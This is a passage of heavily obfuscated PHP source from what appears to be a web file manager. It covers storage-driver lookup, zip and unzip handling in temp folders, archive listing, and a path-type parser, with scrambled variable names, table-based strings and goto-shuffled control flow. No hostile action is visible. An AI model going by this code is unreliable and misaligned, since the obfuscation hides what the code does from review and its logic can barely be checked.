$BÒ„ˆö×¬¶[6] => $b¼Îß¯„); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Fì²¼êÅÓ¯ = $GLOBALS[$BÒ„ˆö×¬¶[988]]; self::$driverListUser = array_to_keyvalue($Fì²¼êÅÓ¯, $BÒ„ˆö×¬¶[364]); } $aš¸—¡§Œ® = self::$driverListUser[$FÁ»ËõÂã‹]; break; case KodIO::KOD_SHARE_LINK: $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[989], $BÒ„ˆö×¬¶[6] => $b¼Îß¯„); $d°õ»ÄÊê´ = Action($BÒ„ˆö×¬¶[990])->sharePathInfo($b¼Îß¯„[$BÒ„ˆö×¬¶[76]]); $Aæ¨ğã¢‘Ø = $d°õ»ÄÊê´[$BÒ„ˆö×¬¶[366]]; if (!$d°õ»ÄÊê´[$BÒ„ˆö×¬¶[366]]) { $dÏØ­®¦ = Model($BÒ„ˆö×¬¶[528])->getInfo($d°õ»ÄÊê´[$BÒ„ˆö×¬¶[437]]); $Aæ¨ğã¢‘Ø = KodIO::clear($dÏØ­®¦[$BÒ„ˆö×¬¶[991]] . $b¼Îß¯„[$BÒ„ˆö×¬¶[984]]); $b¼Îß¯„[$BÒ„ˆö×¬¶[435]] = $dÏØ­®¦; $b¼Îß¯„[$BÒ„ˆö×¬¶[971]] = $Aæ¨ğã¢‘Ø; $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[992], $BÒ„ˆö×¬¶[6] => $b¼Îß¯„); } break; case KodIO::KOD_SHARE_ITEM: $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[993], $BÒ„ˆö×¬¶[6] => $b¼Îß¯„); $dÏØ­®¦ = Model($BÒ„ˆö×¬¶[528])->getInfo($b¼Îß¯„[$BÒ„ˆö×¬¶[364]]); if ($dÏØ­®¦[$BÒ„ˆö×¬¶[366]] == $BÒ„ˆö×¬¶[464]) { $Aæ¨ğã¢‘Ø = KodIO::clear($dÏØ­®¦[$BÒ„ˆö×¬¶[991]] . $b¼Îß¯„[$BÒ„ˆö×¬¶[984]]); $b¼Îß¯„[$BÒ„ˆö×¬¶[435]] = $dÏØ­®¦; $b¼Îß¯„[$BÒ„ˆö×¬¶[971]] = $Aæ¨ğã¢‘Ø; $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[994], $BÒ„ˆö×¬¶[6] => $b¼Îß¯„); } break; default: $Aæ¨ğã¢‘Ø = $b¼Îß¯„[$BÒ„ˆö×¬¶[76]]; $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[995]); break; } $d¤ñ»œÁŠ = $b¼Îß¯„[$BÒ„ˆö×¬¶[76]]; if (!isset(self::$driverCache[$d¤ñ»œÁŠ])) { $fƒÄ¸Æíìù = $BÒ„ˆö×¬¶[72] . self::driverType($aš¸—¡§Œ®[$BÒ„ˆö×¬¶[91]]); if (!class_exists($fƒÄ¸Æíìù)) { show_json("{$fƒÄ¸Æíìù}\40\156\157\164\40\x65\170\x69\x73\164\163\41", !1); } $B§ƒÄŠºó = isset($aš¸—¡§Œ®[$BÒ„ˆö×¬¶[6]]) ? $aš¸—¡§Œ®[$BÒ„ˆö×¬¶[6]] : !1; self::$driverCache[$d¤ñ»œÁŠ] = new $fƒÄ¸Æíìù($B§ƒÄŠºó); } goto B°“°øÊä; E˜Å½ÖÏëÓ: $CÆÂ íóæ°->path = $Aæ¨ğã¢‘Ø; return $CÆÂ íóæ°; goto CœãÇ¸¬©í; B°“°øÊä: $CÆÂ íóæ° = self::$driverCache[$d¤ñ»œÁŠ]; $CÆÂ íóæ°->pathDriver = $eó—Ü˜ù­; $CÆÂ íóæ°->pathBase = $BÒ„ˆö×¬¶[33]; goto cå˜ÁÕ“ïô; bàŸ‹è¼ß: $BÒ„ˆö×¬¶ =& $_SERVER[ì‹É]; $eó—Ü˜ù­ = $b¼Îß¯„[$BÒ„ˆö×¬¶[985]]; $FÁ»ËõÂã‹ = $b¼Îß¯„[$BÒ„ˆö×¬¶[364]]; goto FƒÈ´İ÷µä; CœãÇ¸¬©í: } private static function driverType($d³éÛÚÁŒë) { $CËÂ¸›Ô “ =& $_SERVER[ì‹É]; $d³éÛÚÁŒë = strtolower($d³éÛÚÁŒë); if ($d³éÛÚÁŒë == $CËÂ¸›Ô “[65]) { $d³éÛÚÁŒë = $CËÂ¸›Ô “[997]; } else { if (in_array($d³éÛÚÁŒë, array($CËÂ¸›Ô “[104], $CËÂ¸›Ô “[58], $CËÂ¸›Ô “[998]))) { $d³éÛÚÁŒë = ucfirst($d³éÛÚÁŒë); } else { $d³éÛÚÁŒë = strtoupper($d³éÛÚÁŒë); } } return $d³éÛÚÁŒë; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÏ·ïËá¸ë; if (!$CÏ·ïËá¸ë) { $cÕ‡‡ß„‚ = IO::init($_SERVER[ì‹É][8]); } return $cÕ‡‡ß„‚; } private static function iconvSystem($A¦’ò¶¯ƒ§) { return self::local()->iconvSystem($A¦’ò¶¯ƒ§); } private static function iconvApp($AÂ…†²†‘ò) { return self::local()->iconvApp($AÂ…†²†‘ò); } public static function zip($EìøİÍİ×…, $BØÆ–ØÒ×Î = "\x7a\x69\160", $AÎ›±Õ»÷È = '', $c—éè·ºÆ¾ = REPEAT_RENAME) { goto CŞ„Úµå„; CŞ„Úµå„: $EˆÉÊÅ§Ì =& $_SERVER[ì‹É]; $föÑ­í–İ = self::init($EìøİÍİ×…[0][$EˆÉÊÅ§Ì[76]]); $B¥¼•™ñ¾ = self::info($EìøİÍİ×…[0][$EˆÉÊÅ§Ì[76]]); goto bàÛŒòï‹Ü; bàÛŒòï‹Ü: $C˜Ûâ¨ÑŸ = !1; if (!$AÎ›±Õ»÷È && $föÑ­í–İ->getType() == $EˆÉÊÅ§Ì[104]) { $f„»‰”ÔÈ = self::zipFileList($EìøİÍİ×…); } else { $C˜Ûâ¨ÑŸ = $AÎ›±Õ»÷È ? $AÎ›±Õ»÷È : TEMP_FILES . $EˆÉÊÅ§Ì[999] . time() . rand_string(8) . $EˆÉÊÅ§Ì[8]; mk_dir($C˜Ûâ¨ÑŸ); $f„»‰”ÔÈ = self::zipFileList($EìøİÍİ×…, $C˜Ûâ¨ÑŸ); } $F—Éç¯Å°÷ = $B¥¼•™ñ¾[$EˆÉÊÅ§Ì[28]]; goto Cè°ÄÀá‚; AŒõ™äö·ˆ: $Bä¡‚·İÆç = $cö°¢„²ë® . $F—Éç¯Å°÷ . $EˆÉÊÅ§Ì[94] . $BØÆ–ØÒ×Î; $Bä¡‚·İÆç = get_filename_auto($Bä¡‚·İÆç, $EˆÉÊÅ§Ì[33], $c—éè·ºÆ¾); $B×³ëÅÍÆò = self::iconvSystem($Bä¡‚·İÆç); goto FÂñØ†Ó‰•; FÂñØ†Ó‰•: foreach ($f„»‰”ÔÈ as $EÇÕ±òèáÑ => $dñ±èÌäÌ‘) { $f„»‰”ÔÈ[$EÇÕ±òèáÑ] = self::iconvSystem($dñ±èÌäÌ‘); } KodArchive::create($B×³ëÅÍÆò, $f„»‰”ÔÈ); if (!IO::exist($Bä¡‚·İÆç)) { if ($C˜Ûâ¨ÑŸ) { del_dir($C˜Ûâ¨ÑŸ); } show_json(LNG($EˆÉÊÅ§Ì[1001]), !1); } goto AÏ¸äÌ’…ì; AÏ¸äÌ’…ì: if ($AÎ›±Õ»÷È || !$C˜Ûâ¨ÑŸ) { if ($C˜Ûâ¨ÑŸ && strstr($C˜Ûâ¨ÑŸ, TEMP_FILES)) { $c¼¦“âŒÅ = $f„»‰”ÔÈ = array(); recursion_dir($cö°¢„²ë®, $c¼¦“âŒÅ, $f„»‰”ÔÈ, 0); foreach ($c¼¦“âŒÅ as $c²°øœ‚…’) { del_dir($c²°øœ‚…’); } foreach ($f„»‰”ÔÈ as $fÑŸ÷Òõ¢ ) { if ($fÑŸ÷Òõ¢  == $B×³ëÅÍÆò) { continue; } del_file($fÑŸ÷Òõ¢ ); } } return $Bä¡‚·İÆç; } $C’¼ˆİƒ‚½ = self::pathFather($B¥¼•™ñ¾[$EˆÉÊÅ§Ì[76]]); $BÌÁë¯£ŞÚ = self::move($Bä¡‚·İÆç, $C’¼ˆİƒ‚½, $c—éè·ºÆ¾); goto CĞÊ•öŒ¾; CĞÊ•öŒ¾: if (!$BÌÁë¯£ŞÚ) { del_dir($C˜Ûâ¨ÑŸ); show_json(LNG($EˆÉÊÅ§Ì[1001]), !1); } del_dir($C˜Ûâ¨ÑŸ); return $BÌÁë¯£ŞÚ; goto D¨¡Á¶ĞÚ; Cè°ÄÀá‚: if (count($f„»‰”ÔÈ) > 1) { $E“Ã…ä„ì = IO::info(IO::pathFather($B¥¼•™ñ¾[$EˆÉÊÅ§Ì[76]])); $F—Éç¯Å°÷ = $E“Ã…ä„ì[$EˆÉÊÅ§Ì[28]]; } $cö°¢„²ë® = $C˜Ûâ¨ÑŸ; if (!$cö°¢„²ë®) { $cö°¢„²ë® = get_path_father($B¥¼•™ñ¾[$EˆÉÊÅ§Ì[76]]); $A–¯ÁàÃÂ× = IO::info($cö°¢„²ë®); if (!$A–¯ÁàÃÂ×[$EˆÉÊÅ§Ì[186]]) { show_json(LNG($EˆÉÊÅ§Ì[1000]), !1); } } goto AŒõ™äö·ˆ; D¨¡Á¶ĞÚ: } public static function unzip($Aõğå…Öœ‰, $BãÒÄ»å¡Ú = "\162\145\160\x6c\141\x63\145") { goto aÕµè·×™Ê; FáæÂ¯ãò: return !0; goto Dñƒ×Éï‰‹; BéÛÚÒœ˜: Hook::trigger($B ©ºÜ‘Œ¸[1009], $Cçì¿Ôğ„); recursion_dir($Cçì¿Ôğ„, $A®¶…×œ†Ç, $cíÑÚ÷í‹¦, 0); $Dê¨«¤ªŒ¤ = array_merge($A®¶…×œ†Ç, $cíÑÚ÷í‹¦); goto C†êˆ‰Š¬Û; A‚ÚÒô¤ğË: if (!($Cç¯Ç¸ÒŠ¨ = parent::info($cÆÕøšó³ô))) { show_json(LNG($B ©ºÜ‘Œ¸[1003]), !1); } if (!($f›·µ ‘Ôğ = parent::infoFull($a”¢ÄÀéª¼))) { $a”¢ÄÀéª¼ = parent::mkdir($a”¢ÄÀéª¼); $f›·µ ‘Ôğ = array($B ©ºÜ‘Œ¸[76] => $a”¢ÄÀéª¼); } else { if (isset($f›·µ ‘Ôğ[$B ©ºÜ‘Œ¸[366]]) && trim($f›·µ ‘Ôğ[$B ©ºÜ‘Œ¸[76]], $B ©ºÜ‘Œ¸[8]) != trim($a”¢ÄÀéª¼, $B ©ºÜ‘Œ¸[8])) { $E’ƒš·‡Ó = KodIO::make($f›·µ ‘Ôğ[$B ©ºÜ‘Œ¸[457]]); $CÑÈ´â§†ô = parent::fileNameAuto($E’ƒš·‡Ó, $f›·µ ‘Ôğ[$B ©ºÜ‘Œ¸[28]], REPEAT_RENAME_FOLDER, !0); $a”¢ÄÀéª¼ = parent::mkdir($E’ƒš·‡Ó . $CÑÈ´â§†ô); $f›·µ ‘Ôğ = array($B ©ºÜ‘Œ¸[76] => $a”¢ÄÀéª¼); } } $a”¢ÄÀéª¼ = $f›·µ ‘Ôğ[$B ©ºÜ‘Œ¸[76]]; goto CŞ—°îêÓç; aŠ¾ĞÔˆá: $A‘‹ˆÕ×Ïê = KodArchive::extract($dò®ò¥ğÄÃ, $Cçì¿Ôğ„ . $B ©ºÜ‘Œ¸[8], $F¹ÉŠ‹º½ß); self::archiveExt(); if (!$A‘‹ˆÕ×Ïê[$B ©ºÜ‘Œ¸[1006]]) { show_json($B ©ºÜ‘Œ¸[1007] . $A‘‹ˆÕ×Ïê[$B ©ºÜ‘Œ¸[1008]], !1); } goto BéÛÚÒœ˜; CŞ—°îêÓç: $D½òİ¹×Í = self::tmpFileName($Cç¯Ç¸ÒŠ¨); $Cçì¿Ôğ„ = TEMP_FILES . $D½òİ¹×Í; del_dir($Cçì¿Ôğ„); goto D¨«Œªöˆ¿; dÈˆµÒçŠá: if (!@file_exists(self::iconvSystem($dò®ò¥ğÄÃ))) { $BŠ¬„±§¤ = self::localFilePath($cÆÕøšó³ô, $c…±¤¹»©); $dò®ò¥ğÄÃ = $BŠ¬„±§¤ ? $BŠ¬„±§¤ : parent::download($cÆÕøšó³ô, $dò®ò¥ğÄÃ); } $dò®ò¥ğÄÃ = self::iconvSystem($dò®ò¥ğÄÃ); $F¹ÉŠ‹º½ß = isset($Aõğå…Öœ‰[$B ©ºÜ‘Œ¸[1004]]) ? $Aõğå…Öœ‰[$B ©ºÜ‘Œ¸[1004]] : $B ©ºÜ‘Œ¸[1005]; goto aŠ¾ĞÔˆá; D¨«Œªöˆ¿: mk_dir($Cçì¿Ôğ„); $c…±¤¹»© = self::fileExt($Cç¯Ç¸ÒŠ¨); $dò®ò¥ğÄÃ = $Cçì¿Ôğ„ . $B ©ºÜ‘Œ¸[94] . $c…±¤¹»©; goto dÈˆµÒçŠá; C†êˆ‰Š¬Û: foreach ($Dê¨«¤ªŒ¤ as $e”šƒì³ñ¸) { $e”šƒì³ñ¸ = self::iconvApp($e”šƒì³ñ¸); self::move($e”šƒì³ñ¸, $a”¢ÄÀéª¼, $BãÒÄ»å¡Ú); } del_dir($Cçì¿Ôğ„); if (!$BŠ¬„±§¤) { del_file($dò®ò¥ğÄÃ); } goto FáæÂ¯ãò; aÕµè·×™Ê: $B ©ºÜ‘Œ¸ =& $_SERVER[ì‹É]; $cÆÕøšó³ô = $Aõğå…Öœ‰[$B ©ºÜ‘Œ¸[76]]; $a”¢ÄÀéª¼ = $Aõğå…Öœ‰[$B ©ºÜ‘Œ¸[1002]]; goto A‚ÚÒô¤ğË; Dñƒ×Éï‰‹: } public static function unzipList($a”‘¨¨½„³) { goto F‰”ñˆ‰¼è; aøìèËˆÏÙ: $fåÍ‡Š÷à¼ = self::iconvSystem($fåÍ‡Š÷à¼); if ($fí³¢ø‡Â >= 0) { $f¬òÕ°“¡© = isset($a”‘¨¨½„³[$A¼¤Û·†Ù[1014]]) ? $a”‘¨¨½„³[$A¼¤Û·†Ù[1014]] : !1; $eÉæÔ·İÕÉ = isset($a”‘¨¨½„³[$A¼¤Û·†Ù[28]]) ? $a”‘¨¨½„³[$A¼¤Û·†Ù[28]] : $A¼¤Û·†Ù[33]; KodArchive::filePreview($fåÍ‡Š÷à¼, $fí³¢ø‡Â, $f¬òÕ°“¡©, $eÉæÔ·İÕÉ); self::archiveExt(); die; } $cƒïö÷®ù› = KodArchive::listContent($fåÍ‡Š÷à¼); goto fêˆˆó¢Ãƒ; b·ª×‚è±’: $dÎœŒ´ƒªÀ = json_encode($cƒïö÷®ù›[$A¼¤Û·†Ù[1008]]); self::setContent($Fõåš¸‹«ß, $dÎœŒ´ƒªÀ); if (count($cƒïö÷®ù›[$A¼¤Û·†Ù[1008]]) >= $c¯†óÈ¾é) { show_json(sprintf(LNG($A¼¤Û·†Ù[1012]), count($cƒïö÷®ù›[$A¼¤Û·†Ù[1008]])), !1); } goto a¹œå‘‹‰ˆ; fêˆˆó¢Ãƒ: self::archiveExt(); del_dir($AøÖÈ¢Ïã); if (!$cƒïö÷®ù›[$A¼¤Û·†Ù[1006]]) { show_json($cƒïö÷®ù›[$A¼¤Û·†Ù[1008]], !1); } goto b·ª×‚è±’; bæÀÛçŞŠç: if (!is_dir($AøÖÈ¢Ïã)) { mk_dir($AøÖÈ¢Ïã); } $fåÍ‡Š÷à¼ = $AøÖÈ¢Ïã . $A¼¤Û·†Ù[8] . $F³Ì¥æ†ª•; if (!@file_exists(self::iconvSystem($fåÍ‡Š÷à¼))) { if (isset($cÁ®¹«ì›)) { url_request($c¯‘Òš´°, $A¼¤Û·†Ù[1013], $fåÍ‡Š÷à¼); } else { $E˜¸ºß˜Ûâ = self::localFilePath($c¯‘Òš´°, $D¥È´ÁßŒ¾); $fåÍ‡Š÷à¼ = $E˜¸ºß˜Ûâ ? $E˜¸ºß˜Ûâ : self::download($c¯‘Òš´°, $fåÍ‡Š÷à¼); } } goto aøìèËˆÏÙ; a¹œå‘‹‰ˆ: return $cƒïö÷®ù›[$A¼¤Û·†Ù[1008]]; goto EÃßô‰´Í; F‰”ñˆ‰¼è: $A¼¤Û·†Ù =& $_SERVER[ì‹É]; $c¯‘Òš´° = $a”‘¨¨½„³[$A¼¤Û·†Ù[76]]; $fí³¢ø‡Â = isset($a”‘¨¨½„³[$A¼¤Û·†Ù[1010]]) ? $a”‘¨¨½„³[$A¼¤Û·†Ù[1010]] : -1; goto EÆëø¢ïôª; dæ±•Û¼²: if (isset($cÁ®¹«ì›)) { $cÏ¸Ôµµ = array($cÁ®¹«ì›[$A¼¤Û·†Ù[76]], $cÁ®¹«ì›[$A¼¤Û·†Ù[1010]], $cÁ®¹«ì›[$A¼¤Û·†Ù[28]]); $F³Ì¥æ†ª• = md5(implode($A¼¤Û·†Ù[71], $cÏ¸Ôµµ)) . $A¼¤Û·†Ù[94] . get_path_ext($cÁ®¹«ì›[$A¼¤Û·†Ù[28]]); } else { $cÏ¸Ôµµ = array($FÓèáÉŸÒ™[$A¼¤Û·†Ù[28]], $FÓèáÉŸÒ™[$A¼¤Û·†Ù[76]], $FÓèáÉŸÒ™[$A¼¤Û·†Ù[78]]); $F³Ì¥æ†ª• = md5(implode($A¼¤Û·†Ù[71], $cÏ¸Ôµµ)) . $A¼¤Û·†Ù[94] . $D¥È´ÁßŒ¾; } if ($fí³¢ø‡Â == -1) { $Fõåš¸‹«ß = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\126\x69\145\x77\57{$E¶äÉÆ«¢}\x2f{$F³Ì¥æ†ª•}\56\154\x6f\x67"; $f¿¼’–š»Ë = self::infoFull($Fõåš¸‹«ß); if ($f¿¼’–š»Ë) { $Fõåš¸‹«ß = $f¿¼’–š»Ë[$A¼¤Û·†Ù[76]]; $F¨¨í¯š®¾ = self::getContent($Fõåš¸‹«ß); if ($F¨¨í¯š®¾) { $dÎœŒ´ƒªÀ = json_decode($F¨¨í¯š®¾, !0); if (count($dÎœŒ´ƒªÀ) >= $c¯†óÈ¾é) { show_json(sprintf(LNG($A¼¤Û·†Ù[1012]), count($dÎœŒ´ƒªÀ)), !1); } return $dÎœŒ´ƒªÀ; } } else { $Fõåš¸‹«ß = self::mkfile($Fõåš¸‹«ß); } } $AøÖÈ¢Ïã = TEMP_FILES . $E¶äÉÆ«¢; goto bæÀÛçŞŠç; A‚ÛõœæĞ¦: $FÓèáÉŸÒ™ = self::info($B—•­ä ¬î); $D¥È´ÁßŒ¾ = self::fileExt($FÓèáÉŸÒ™); $E¶äÉÆ«¢ = self::tmpFileName($FÓèáÉŸÒ™); goto dæ±•Û¼²; EÆëø¢ïôª: $c¯†óÈ¾é = 50000; if (request_url_safe($c¯‘Òš´°)) { $cÁ®¹«ì› = parse_url_query($c¯‘Òš´°); if (!isset($cÁ®¹«ì›[$A¼¤Û·†Ù[76]])) { show_json($A¼¤Û·†Ù[1011], !1); } } $B—•­ä ¬î = isset($cÁ®¹«ì›) ? $cÁ®¹«ì›[$A¼¤Û·†Ù[76]] : $c¯‘Òš´°; goto A‚ÛõœæĞ¦; EÃßô‰´Í: } private static function fileExt($DéÀê½¡­ß) { $d¢…¡¨¾’™ =& $_SERVER[ì‹É]; $eÜ´ß–»ïÑ = $DéÀê½¡­ß[$d¢…¡¨¾’™[157]]; if ($eÜ´ß–»ïÑ == $d¢…¡¨¾’™[1015]) { $f†ÎÎãé¡ = $d¢…¡¨¾’™[1016]; if (substr($DéÀê½¡­ß[$d¢…¡¨¾’™[28]], -strlen($f†ÎÎãé¡)) == $f†ÎÎãé¡) { $eÜ´ß–»ïÑ = $d¢…¡¨¾’™[1017]; } } self::archiveExt($eÜ´ß–»ïÑ); return $eÜ´ß–»ïÑ; } private static function zipFileList($a¾‘›îµ, $B½Èƒ£ø­ = false) { $Dçìƒù¦ö• =& $_SERVER[ì‹É]; $bñĞíÏƒ™¹ = array(); foreach ($a¾‘›îµ as $Dç†ê«Ü‡”) { $D¬½¯ë½Å» = $Dç†ê«Ü‡”[$Dçìƒù¦ö•[76]]; if ($B½Èƒ£ø­) { $D¬½¯ë½Å» = self::copy($Dç†ê«Ü‡”[$Dçìƒù¦ö•[76]], $B½Èƒ£ø­, $Dçìƒù¦ö•[749]); } if ($D¬½¯ë½Å» && self::local()->exist($D¬½¯ë½Å»)) { $bñĞíÏƒ™¹[$Dç†ê«Ü‡”[$Dçìƒù¦ö•[76]]] = $D¬½¯ë½Å»; } } if (!empty($bñĞíÏƒ™¹)) { return array_values($bñĞíÏƒ™¹); } show_json(LNG($Dçìƒù¦ö•[1018]), !1); } public static function tmpFileName($D‘‚î¬Ú–½) { $d‘–§„¹Ì¦ =& $_SERVER[ì‹É]; $a÷ĞÑÑŞÄ‘ = array($D‘‚î¬Ú–½[$d‘–§„¹Ì¦[28]], $D‘‚î¬Ú–½[$d‘–§„¹Ì¦[76]], $D‘‚î¬Ú–½[$d‘–§„¹Ì¦[78]], $D‘‚î¬Ú–½[$d‘–§„¹Ì¦[455]]); return md5(implode($d‘–§„¹Ì¦[71], $a÷ĞÑÑŞÄ‘)); } private static function localFilePath($AÇ‘‘¤ŸÔá, $fá†Œìù¡“) { goto cÈÀî­‘ì«; cÈÀî­‘ì«: $fà†¦²±İ =& $_SERVER[ì‹É]; if ($fá†Œìù¡“ == $fà†¦²±İ[1019] && strtoupper(substr(PHP_OS, 0, 3)) == $fà†¦²±İ[1020]) { return !1; } $Cßø²„šÅ = KodIO::parse($AÇ‘‘¤ŸÔá); goto EƒŠ¨„±«¿; EƒŠ¨„±«¿: if ($Cßø²„šÅ[$fà†¦²±İ[29]] == KodIO::KOD_SOURCE) { $CÉÅ‡²ç = Model($fà†¦²±İ[757])->fileInfoGet(KodIO::sourceID($AÇ‘‘¤ŸÔá)); if (!$CÉÅ‡²ç[$fà†¦²±İ[76]]) { show_json($fà†¦²±İ[1021], !1); } $AÇ‘‘¤ŸÔá = $CÉÅ‡²ç[$fà†¦²±İ[76]]; } $A§Š›Ô­˜ô = self::init($AÇ‘‘¤ŸÔá); $FÂ¼‹ÈÌ©• = $A§Š›Ô­˜ô->getType(); goto a¡ãÔêÕç; a¡ãÔêÕç: if ($FÂ¼‹ÈÌ©• == $fà†¦²±İ[104] || $FÂ¼‹ÈÌ©• == $fà†¦²±İ[1022]) { if (!$A§Š›Ô­˜ô->exist($A§Š›Ô­˜ô->path)) { show_json(LNG($fà†¦²±İ[103]), !1); } return $A§Š›Ô­˜ô->path; } return !1; goto fÚ¾®‘“í…; fÚ¾®‘“í…: } private static function archiveExt($AÍšİ¡£îß = '') { $GLOBALS[$_SERVER[ì‹É][1023]] = $AÍšİ¡£îß; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\122\x65\143\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\x69\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\154\145\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\160\122\x6f\157\x74\123\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\123\150\x61\162\x65\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\x65\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\162\x65\x49\164\145\155\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\141\162\143\150\175"; const KOD_BLOCK = "\173\x62\x6c\157\x63\x6b\x7d"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\x65\x6e\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\145\x72\175"; public static function typeList() { $càŞÃõ¯‰Ã =& $_SERVER[ì‹É]; return array($càŞÃõ¯‰Ã[1024] => self::KOD_SOURCE, $càŞÃõ¯‰Ã[1025] => self::KOD_USER_RECYCLE, $càŞÃõ¯‰Ã[1026] => self::KOD_USER_FAV, $càŞÃõ¯‰Ã[1027] => self::KOD_USER_FILE_TAG, $càŞÃõ¯‰Ã[1028] => self::KOD_USER_FILE_TYPE, $càŞÃõ¯‰Ã[1029] => self::KOD_GROUP_ROOT_SELF, $càŞÃõ¯‰Ã[1030] => self::KOD_USER_SHARE, $càŞÃõ¯‰Ã[1031] => self::KOD_USER_SHARE_LINK, $càŞÃõ¯‰Ã[1032] => self::KOD_USER_SHARE_TO_ME, $càŞÃõ¯‰Ã[1033] => self::KOD_SHARE_ITEM, $càŞÃõ¯‰Ã[1034] => self::KOD_SHARE_LINK, $càŞÃõ¯‰Ã[1035] => self::KOD_SEARCH, $càŞÃõ¯‰Ã[1036] => self::KOD_BLOCK, $càŞÃõ¯‰Ã[1037] => self::KOD_IO, $càŞÃõ¯‰Ã[1038] => self::KOD_USER_RECENT, $càŞÃõ¯‰Ã[1039] => self::KOD_USER_DRIVER); } public static function parse($A‚Œ°É÷å) { goto F¹…ÙŞÂ„; DŒòì˜Ä‡œ: $e‹ç£Ÿ¼è“ = array($FßÛ¦¢ï•[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $d¡Àà‚·ì[$FßÛ¦¢ï•[1044]] = in_array($d¡Àà‚·ì[$FßÛ¦¢ï•[29]], $e‹ç£Ÿ¼è“); return $d¡Àà‚·ì; goto C’øŠÀ¬¡æ; F¹…ÙŞÂ„: $FßÛ¦¢ï• =& $_SERVER[ì‹É]; $A‚Œ°É÷å = self::clear($A‚Œ°É÷å); $EÙéÓİÉÑ© = array_values(self::typeList()); goto D×äÔŞ‡Š©; D×äÔŞ‡Š©: preg_match($FßÛ¦¢ï•[1040], $A‚Œ°É÷å, $DîÍº‘ÑÛ); $d¡Àà‚·ì = array($FßÛ¦¢ï•[385] => !1, $FßÛ¦¢ï•[1041] => !1, $FßÛ¦¢ï•[382] => !1, $FßÛ¦¢ï•[76] => $A‚Œ°É÷å, $FßÛ¦¢ï•[985] => !1, $FßÛ¦¢ï•[984] => $FßÛ¦¢ï•[33]); if (is_array($DîÍº‘ÑÛ) && count($DîÍº‘ÑÛ) == 5) { $FÛÇš®ÂŠğ = $FßÛ¦¢ï•[1042] . $DîÍº‘ÑÛ[2] . $FßÛ¦¢ï•[312]; if (in_array($FÛÇš®ÂŠğ, $EÙéÓİÉÑ©)) { $d¡Àà‚·ì[$FßÛ¦¢ï•[985]] = $DîÍº‘ÑÛ[1]; $d¡Àà‚·ì[$FßÛ¦¢ï•[29]] = $FÛÇš®ÂŠğ; $d¡Àà‚·ì[$FßÛ¦¢ï•[1043]] = substr($FÛÇš®ÂŠğ, 1, -1); $d¡Àà‚·ì[$FßÛ¦¢ï•[364]] = $DîÍº‘ÑÛ[3]; } $d¡Àà‚·ì[$FßÛ¦¢ï•[984]] = $DîÍº‘ÑÛ[4]; } goto DŒòì˜Ä‡œ; C’øŠÀ¬¡æ: } public static function clear($Aïø¹«¯‹£) { goto aƒâË‡«µª; eâ›—âÂè‹: if ($Aïø¹«¯‹£ == $aˆá–“‘áì[8]) { return $aˆá–“‘áì[8]; } $Aïø¹«¯‹£ = rtrim($Aïø¹«¯‹£, $aˆá–“‘áì[8]); return $Aïø¹«¯‹£; goto D•ğ¾ã’ìæ; aƒâË‡«µª: $aˆá–“‘áì =& $_SERVER[ì‹É]; $Aïø¹«¯‹£ = str_replace($aˆá–“‘áì[96], $aˆá–“‘áì[8], $Aïø¹«¯‹£); $eŸ¾¸™ğ“¶ = $aˆá–“‘áì[1045]; goto eè¾Ô¡æ¶Í; eè¾Ô¡æ¶Í: if (substr($Aïø¹«¯‹£, 0, 3) == $aˆá–“‘áì[1046]) { $Aïø¹«¯‹£ = substr($Aïø¹«¯‹£, 3); } while (strstr($Aïø¹«¯‹£, $eŸ¾¸™ğ“¶)) { $Aïø¹«¯‹£ = str_replace($eŸ¾¸™ğ“¶, $aˆá–“‘áì[8], $Aïø¹«¯‹£); } $Aïø¹«¯‹£ = preg_replace($aˆá–“‘áì[1047], $aˆá–“‘áì[8], $Aïø¹«¯‹£); goto eâ›—âÂè‹; D•ğ¾ã’ìæ: } public static function sourceID($FõŸÒ§Ôõ) { $e²×ĞŒ”ß° =& $_SERVER[ì‹É]; $f¨ñ¡Áƒ§ = self::parse($FõŸÒ§Ôõ); if ($f¨ñ¡Áƒ§[$e²×ĞŒ”ß°[29]] !== self::KOD_SOURCE) { show_json(LNG($e²×ĞŒ”ß°[1048]), !1); } return $f¨ñ¡Áƒ§[$e²×ĞŒ”ß°[364]]; } public static function make($A½«—À‹øç) { if (!$A½«—À‹øç) { return !1; } return self::makePath(self::KOD_SOURCE, intval($A½«—À‹øç)); } public static function makeShare($C”ƒ¦«¶Õ, $c÷ïâÛÛ·Œ) { return self::makePath(self::KOD_SHARE_ITEM, $C”ƒ¦«¶Õ, $c÷ïâÛÛ·Œ); } public static function makeFileTypePath($dÇ‘öƒšŞ×) { return self::makePath(self::KOD_USER_FILE_TYPE, $dÇ‘öƒšŞ×); } public static function 